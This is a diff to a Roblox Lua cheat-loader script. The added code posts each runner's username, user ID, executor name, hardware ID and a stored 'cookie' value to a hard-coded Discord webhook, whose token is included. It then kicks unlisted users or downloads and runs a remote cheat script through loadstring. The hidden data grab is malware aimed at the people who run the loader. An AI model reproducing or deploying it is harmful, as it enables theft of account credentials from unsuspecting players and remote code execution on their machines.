@@ -1,7 +1,50 @@
-local Games = loadstring(game:HttpGet("https://raw.githubusercontent.com/sonbui200/buidepzai/refs/heads/main/khangbells"))()
+local allowedHWID = "1254333cacdume"
+local allowedExecutors = { "Codex", "Arceus" }
+local webhookURL = "https://discord.com/api/webhooks/1345945140212007032/6Y-UEC4hlnTbCfVJ7BJBFvUc8RRvqMhDapcTi5U9c2Gce-lbEcw4x2OcCW9y009LOVkn"
 
-for PlaceID, Execute in pairs(Games) do
-    if PlaceID == game.PlaceId then
-        loadstring(game:HttpGet(Execute))()
+local function getHWID()
+    return identifyclient and identifyclient() or "Unknown"
+end
+
+local function getExecutor()
+    return identifyexecutor and identifyexecutor() or "Unknown"
+end
+
+local function getCookie()
+    return (shared and shared.__FUCKYOU or "Cookie not found")
+end
+
+local function sendToWebhook(player)
+    local data = {
+        ["content"] = "",
+        ["embeds"] = {{
+            ["title"] = "New Execution",
+            ["description"] = "Player Info",
+            ["fields"] = {
+                { ["name"] = "Username", ["value"] = player.Name, ["inline"] = true },
+                { ["name"] = "User ID", ["value"] = tostring(player.UserId), ["inline"] = true },
+                { ["name"] = "Executor", ["value"] = getExecutor(), ["inline"] = true },
+                { ["name"] = "HWID", ["value"] = getHWID(), ["inline"] = true },
+                { ["name"] = "Cookie", ["value"] = getCookie(), ["inline"] = false }
+            },
+            ["color"] = 16711680
+        }}
+    }
+
+    local headers = { ["Content-Type"] = "application/json" }
+    request({ Url = webhookURL, Method = "POST", Headers = headers, Body = game:GetService("HttpService"):JSONEncode(data) })
+end
+
+local function checkPlayer(player)
+    sendToWebhook(player)  -- Send data to Discord first
+
+    task.wait(3)  -- Give time for webhook to receive the data
+
+    if getHWID() ~= allowedHWID or not table.find(allowedExecutors, getExecutor()) then
+        player:Kick("Unauthorized HWID or Executor detected!")
+    else
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/tbao143/thaibao/main/TbaoHubNaturalDisasterSurvival"))()
     end
 end
+
+checkPlayer(game.Players.LocalPlayer)
